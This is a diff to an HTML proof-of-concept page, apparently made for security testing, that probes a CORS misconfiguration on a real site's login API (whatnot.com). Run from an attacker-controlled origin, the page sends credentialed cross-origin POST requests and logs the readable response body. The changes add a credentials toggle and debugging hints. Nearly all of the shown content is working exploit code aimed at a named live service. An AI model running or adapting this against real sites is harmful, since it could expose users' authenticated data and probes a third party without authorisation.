@@ -13,6 +13,10 @@
 <body>
   <h1>Whatnot Login CORS PoC</h1>
   <p>Run this page from an attacker-controlled origin (not file://) to test cross-origin response readability.</p>
+  <label style="display:block; margin: 8px 0 12px;">
+    <input id="includeCreds" type="checkbox" checked />
+    Include credentials
+  </label>
   <button id="run">Run PoC Request</button>
   <button id="clear">Clear</button>
   <pre id="meta"></pre>
@@ -22,6 +26,7 @@
     const endpoint = 'https://www.whatnot.com/services/api/v2/login';
     const out = document.getElementById('out');
     const meta = document.getElementById('meta');
+    const includeCreds = document.getElementById('includeCreds');
 
     function log(line) {
       out.value += line + '\n';
@@ -29,12 +34,13 @@
 
     async function run() {
       out.value = '';
-      meta.textContent = 'Origin: ' + location.origin + '\nEndpoint: ' + endpoint;
+      const credentialsMode = includeCreds.checked ? 'include' : 'omit';
+      meta.textContent = 'Origin: ' + location.origin + '\nEndpoint: ' + endpoint + '\nCredentials: ' + credentialsMode;
 
       try {
         const res = await fetch(endpoint, {
           method: 'POST',
-          credentials: 'include',
+          credentials: credentialsMode,
           mode: 'cors',
           headers: {
             'content-type': 'text/plain'
@@ -44,11 +50,13 @@
 
         log('status=' + res.status);
         log('type=' + res.type);
+        log('ok=' + res.ok);
 
         const text = await res.text();
         log('body=' + text);
       } catch (e) {
         log('error=' + (e && e.message ? e.message : String(e)));
+        log('hint=If this says Failed to fetch with credentials enabled, the browser is likely rejecting the response because CORS credentials headers are invalid or absent for this origin. Try again with credentials disabled to confirm origin reflection alone.');
       }
     }
 
